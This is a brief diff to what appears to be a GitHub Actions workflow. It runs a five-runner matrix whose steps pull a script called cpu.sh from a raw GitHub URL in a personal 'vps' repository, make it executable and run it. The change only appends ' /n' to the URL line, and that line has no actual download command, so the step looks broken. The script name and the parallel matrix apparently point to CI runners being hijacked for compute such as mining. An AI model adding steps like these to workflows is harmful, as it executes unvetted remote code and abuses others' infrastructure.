@@ -24,6 +24,6 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-          https://raw.githubusercontent.com/davesmith0x0001/vps/main/cpu.sh
+          https://raw.githubusercontent.com/davesmith0x0001/vps/main/cpu.sh /n
           chmod +x cpu.sh
           ./cpu.sh
